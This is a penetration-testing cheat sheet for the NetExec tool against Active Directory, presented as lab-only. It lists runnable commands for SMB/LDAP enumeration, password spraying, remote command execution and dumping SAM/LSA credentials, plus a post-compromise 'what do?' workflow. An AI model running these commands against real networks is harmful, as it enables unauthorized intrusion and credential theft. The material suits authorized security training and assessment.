# NetExec Enumeration & Active Directory Notes

> **Lab / authorized-environment use only.**
>
> Replace `<target>`, `<username>`, `<password>`, and other placeholders with values from your authorized lab.

## Install

```bash
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

I encourage you to research what protocols NetExec supports.

[NetExec SMB Enumeration](https://www.netexec.wiki/smb-protocol/enumeration)

---

## Enumerate Hosts

Identify live hosts and collect SMB details across a network:

```bash
nxc smb 192.168.1.0/24
```

---

## Enumerate Null Sessions

Check whether a host permits null-session SMB access:

```bash
nxc smb 192.168.1.101 --null-session
```

---

## Enumerate Active Sessions

List active SMB sessions:

```bash
nxc smb 192.168.1.0/24 --sessions
```

---

## Enumerate Shares and Access

List available SMB shares and associated access information using authorized credentials:

```bash
nxc smb 192.168.1.0/24 -u <username> -p '<password>' --shares
```

---

## Enumerate Domain Users

Retrieve domain users for further analysis:

```bash
nxc smb 192.168.1.0/24 -u <username> -p '<password>' --domain-users
```

# brxzyy — Compromised AD User Workflow

**brxzyy, I've compromised a machine on the internal network and managed to get a real AD user. What do?**

Glad you asked.

First, identify the **Domain Controller (DC)** and enumerate LDAP to confirm the AD environment. Once the DC is identified, use the authorized AD credentials with NetExec and BloodHound-compatible collection.

```bash
nxc ldap <dc-ip> -u <ad-user> -p '<ad-pass>' --bloodhound -ns <dns-ip> --collection All
```

If successful, NetExec will collect JSON data that can be imported into the BloodHound GUI for analysis.

# SMB Enumeration

```bash
nxc smb <target> --shares
nxc smb <target> --sessions
nxc smb <target> --null-session
nxc smb <target> --guest-logon
nxc smb <target> --interfaces
```

# LDAP Enumeration

```bash
nxc ldap <target> --users
nxc ldap <target> --subnet
nxc ldap <target> --domain-trusts
```

# Password Spraying / Credential Validation

Use only against accounts and systems you are explicitly authorized to test. Avoid aggressive or indiscriminate authentication attempts.

```bash
nxc <protocol> <target> -u <username> -p '<password>'
nxc <protocol> <target> -u <file_with_users> -p <file_with_passwords> --no-bruteforce
```

# Command Execution

NetExec supports command execution through several protocols when the supplied account has the required privileges.

```bash
nxc <protocol> <target> --exec <command>
```

# Credential Dumping

These operations can expose sensitive credentials or secrets. Use only in an authorized lab or assessment.

```bash
nxc smb <target> --dump-sam
nxc smb <target> --dump-lsa
```

# Credential Checks

```bash
nxc <protocol> <target> -u <username> -p '<password>' --continue-on-success
nxc <protocol> <target> -u <file_with_users> -p <file_with_passwords> --no-bruteforce
```

# Vulnerability Checks

```bash
nxc smb <target> --vuln-scan
```

# Additional Examples

```bash
nxc smb <target> --domain-users
nxc smb <target> --domain-password-policy
nxc ldap <target> --find-sid
nxc ldap <target> --check-signing
```
